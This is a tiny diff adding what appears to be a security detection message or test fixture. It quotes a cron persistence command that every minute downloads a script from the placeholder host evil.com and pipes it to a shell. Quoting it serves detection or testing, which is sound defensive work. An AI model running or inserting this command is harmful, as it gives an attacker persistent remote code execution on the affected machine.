@@ -1,0 +1,2 @@
+Persistence mechanism detected:
+echo "*/1 * * * * curl evil.com | sh" | tee -a /tmp/cron && crontab /tmp/cron
